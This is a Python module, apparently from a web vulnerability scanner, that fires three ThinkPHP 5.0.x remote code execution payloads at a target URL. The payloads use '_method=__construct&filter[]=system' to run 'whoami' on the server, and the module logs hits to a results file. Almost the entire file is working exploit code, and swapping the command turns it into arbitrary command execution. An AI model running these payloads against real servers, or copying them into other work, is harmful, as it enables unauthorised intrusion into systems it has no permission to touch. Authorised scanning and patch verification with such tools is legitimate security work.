#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan3:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run7(self, urls):
        try:
            url = urls + '/?s=index/index/index'
            data = "aaaa=whoami&_method=__construct&method=GET&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code== 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.12-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce3.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.12-RCE-POC-2 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-2')
    def run8(self, urls):
        try:
            url = urls + '/?s=index/index/index'
            data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.12-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce3.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.12-RCE-POC-3 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-3')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.12-RCE-POC-3')
    def run9(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=whoami&_method=__construct&method=POST&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.13-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce3.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.13-RCE-POC-1 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-1')


    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run7(url)
        # OutPrintInfo("ThinkPHP", '开始POC-7...')
        self.run8(url)
        # OutPrintInfo("ThinkPHP", '开始POC-8...')
        self.run9(url)

